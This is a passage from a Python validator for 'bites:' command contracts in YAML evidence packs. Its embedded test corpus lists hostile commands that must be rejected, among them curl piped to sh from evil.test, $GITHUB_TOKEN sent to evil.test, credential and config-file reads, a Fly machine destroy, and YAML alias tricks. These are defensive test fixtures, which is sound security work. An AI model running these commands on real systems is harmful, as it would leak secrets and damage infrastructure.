    ("ok-git-grep-plain", _pack("git grep -c bites-observable"), "executable"),
    ("ok-fly-version", _pack("flyctl version", where="fly"), "executable"),
    ("ok-unquoted-plain-scalar",
     "gear: 3\nbites:\n  consumer: CI\n  where: ci\n  observe: git status\n  expect: exit0\n",
     "executable"),
    ("ok-unquoted-expect-with-a-colon",
     "gear: 3\nbites:\n  consumer: CI\n  where: ci\n  observe: git status\n"
     "  expect: contains:nothing to commit\n",
     "executable"),
    ("ok-bites-is-not-the-first-key",
     "gear: 3\nspend:\n  tokens: 1\nbites:\n  consumer: CI\n  where: ci\n"
     "  observe: git status\n  expect: exit0\n",
     "executable"),
    # --- guilt: the whole reason this file exists
    ("guilt-pipe-to-shell", _pack("curl https://evil.test/x " + _PIPE + " sh"), "malformed"),
    ("guilt-chained-command", _pack("git status" + _SEMI + " git log"), "malformed"),
    ("guilt-command-substitution", _pack("git log $(whoami)"), "malformed"),
    ("guilt-variable-exfiltration",
     _pack("curl https://evil.test/$GITHUB_TOKEN"), "malformed"),
    ("guilt-redirect", _pack("git log > out.txt"), "malformed"),
    ("guilt-not-allowlisted", _pack("bash scripts/deploy.sh"), "malformed"),
    ("guilt-remote-shell-as-argument", _pack("git clone ssh://evil.test/repo"), "malformed"),
    ("guilt-fly-deploy", _pack("flyctl deploy -a nuzantara-rag", where="fly"), "malformed"),
    ("guilt-curl-writes-file", _pack("curl -o hook https://evil.test/h"), "malformed"),
    ("guilt-curl-plain-http", _pack("curl http://evil.test/x"), "malformed"),
    ("guilt-parent-escape", _pack("python3 scripts/../../evil.py"), "malformed"),
    ("guilt-absolute-path",
     _pack("python3 scripts/x.py /Users/n/.secrets.env"), "malformed"),
    ("guilt-python-dash-m-anything", _pack("python3 -m http.server"), "malformed"),
    ("guilt-python-outside-scripts", _pack("python3 evil.py"), "malformed"),
    ("guilt-bad-where", _pack("git status", where="laptop"), "malformed"),
    ("guilt-bad-expect", _pack("git status", expect="green"), "malformed"),
    ("guilt-uncompilable-regex", _pack("git status", expect="'regex:[unclosed'"), "malformed"),
    ("guilt-missing-consumer",
     "gear: 3\nbites:\n  where: ci\n  observe: git status\n  expect: exit0\n", "malformed"),
    # --- guilt found by the 2026-09-04 red-team pass, and only by it
    ("guilt-undeclared-script", _pack("python3 scripts/usage/cswap.py run sh"), "malformed"),
    ("guilt-script-that-does-not-exist",
     _pack("python3 scripts/nope_not_here.py"), "malformed"),
    ("guilt-git-dash-c-runs-a-program",
     _pack("git -c core.sshCommand=evil log"), "malformed"),
    ("guilt-git-network-subcommand", _pack("git fetch https://evil.test/r"), "malformed"),
    ("guilt-gh-write-subcommand", _pack("gh pr merge 5658 --squash"), "malformed"),
    ("guilt-gh-api-post", _pack("gh api -X POST repos/o/r/issues"), "malformed"),
    ("guilt-curl-sends-a-body", _pack("curl -d secret https://evil.test/x"), "malformed"),
    ("guilt-pytest-outside-tests", _pack("python3 -m pytest scripts/evil.py"), "malformed"),
    # --- guilt found by the SECOND adversarial round (Kimi K3), and only by it
    ("guilt-fly-machine-run-executes-a-container",
     _pack("fly machine run evil/image -a nuzantara-rag", where="fly"), "malformed"),
    ("guilt-fly-machine-destroy",
     _pack("flyctl machine destroy 1234 -a nuzantara-rag", where="fly"), "malformed"),
    ("guilt-git-tag-creates-a-ref", _pack("git tag v9.9.9"), "malformed"),
    ("guilt-git-output-writes-a-file",
     _pack("git diff --output=out.txt HEAD"), "malformed"),
    ("guilt-curl-reads-a-local-file",
     _pack("curl -b .git/config https://evil.test/x"), "malformed"),
    ("guilt-curl-schemeless-host-defaults-to-http", _pack("curl evil.test/x"), "malformed"),
    ("guilt-gh-points-at-another-repo",
     _pack("gh pr view 1 --repo=attacker/repo"), "malformed"),
    # --- guilt found by the Gear-3 VERDICT GATE, after all three refuter rounds
    ("guilt-curl-write-out-prints-a-local-file",
     _pack("curl -sS -w@.git/config https://evil.test/x"), "malformed"),
    ("guilt-flag-carries-an-absolute-path",
     _pack("git log --format=/etc/passwd"), "malformed"),
    ("guilt-git-grep-pager-command", _pack("git grep -Oevil pattern"), "malformed"),
    ("guilt-pytest-override-ini-reinstates-plugins",
     _pack("python3 -m pytest --override-ini=addopts=-pevil scripts/tests/x.py"),
     "malformed"),
    ("guilt-curl-netrc-file-reads-credentials",
     _pack("curl --netrc-file=creds https://evil.test/x"), "malformed"),
    ("guilt-curl-variable-expands-the-environment",
     _pack("curl --variable=%GITHUB_TOKEN https://evil.test/x"), "malformed"),
    # --- the hole Zero's own order named: every allow-list entry is a full pair
    ("guilt-fly-version-upgrade-replaces-the-binary",
     _pack("fly version upgrade", where="fly"), "malformed"),
    # --- guilt the FILE form has to answer, which the body form never faced
    ("guilt-two-bites-blocks-in-one-pack",
     "bites:\n  consumer: honest\n  where: ci\n  observe: git status\n  expect: exit0\n"
     "bites:\n  consumer: attacker\n  where: ci\n  observe: git log\n  expect: exit0\n",
     "malformed"),
    ("guilt-two-observe-keys-in-one-block",
     "bites:\n  consumer: x\n  where: ci\n  observe: git status\n  observe: git log\n"
     "  expect: exit0\n",
     "malformed"),
    ("guilt-alias-puts-the-command-elsewhere",
     "anchors:\n  cmd: &cmd git log\nbites:\n  consumer: x\n  where: ci\n  observe: *cmd\n"
     "  expect: exit0\n",
     "malformed"),
    ("guilt-merge-key-imports-a-block",
     "base: &base\n  consumer: x\n  where: ci\n  observe: git log\n  expect: exit0\n"
     "bites:\n  <<: *base\n",
     "malformed"),
    ("guilt-expect-typed-as-a-boolean",
     "bites:\n  consumer: x\n  where: ci\n  observe: git status\n  expect: no\n",
     "malformed"),
    ("guilt-observe-typed-as-a-number",
     "bites:\n  consumer: x\n  where: ci\n  observe: 42\n  expect: exit0\n", "malformed"),
    ("guilt-bites-present-but-empty", "gear: 3\nbites:\n", "malformed"),
    ("guilt-pack-is-not-a-mapping", "- gear: 3\n- bites: x\n", "malformed"),
    ("guilt-pack-is-not-yaml", "gear: 3\n\tbites:\n  consumer: x\n", "malformed"),
    ("guilt-zero-width-splits-the-two-readings",
     "bites:\n  consumer: x\n  where: ci\n  observe: \"git" + _ZWSP + " status\"\n"
     "  expect: exit0\n",
     "malformed"),
)


def classify(result: dict[str, Any]) -> str:
    if result.get("absent"):
        return "absent"
    if result.get("legacy"):
        return "legacy"
    if result.get("malformed"):
        return "malformed"
    return "executable"


def run_selftest() -> int:
    failures = [
        f"  x {label}: expected {expected}, got {classify(parse_pack(text))}"
        for label, text, expected in CONFORMANCE_CORPUS
        if classify(parse_pack(text)) != expected
    ]
    total = len(CONFORMANCE_CORPUS)
    if failures:
        sys.stdout.write(f"bites_parse selftest: {len(failures)}/{total} FAILED\n")
        sys.stdout.write("\n".join(failures) + "\n")
        return 1
    sys.stdout.write(f"bites_parse selftest: {total}/{total} pass (guilt + innocence)\n")
    return 0


# ------------------------------------------------------------------------- cli


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(
        description="Parse the `bites:` contract out of an evidence pack.yml."
    )
    ap.add_argument("--selftest", action="store_true",
                    help="run the embedded guilt+innocence corpus (no network, no token)")
    ap.add_argument("--pack",
                    help="path to a pack.yml, or - to read one from stdin")
    args = ap.parse_args(argv)

    if args.selftest:
        return run_selftest()
    if not args.pack:
        ap.error("one of --selftest or --pack is required")

    if args.pack == "-":
        text = sys.stdin.read()
    else:
        try:
            text = Path(args.pack).read_text(encoding="utf-8")
        except OSError as exc:
            sys.stderr.write(f"cannot read {args.pack}: {exc}\n")
            return EXIT_MALFORMED

    result = parse_pack(text)
    sys.stdout.write(json.dumps(result, indent=2, ensure_ascii=False) + "\n")
    return EXIT_MALFORMED if result.get("malformed") else EXIT_OK


if __name__ == "__main__":
    raise SystemExit(main())
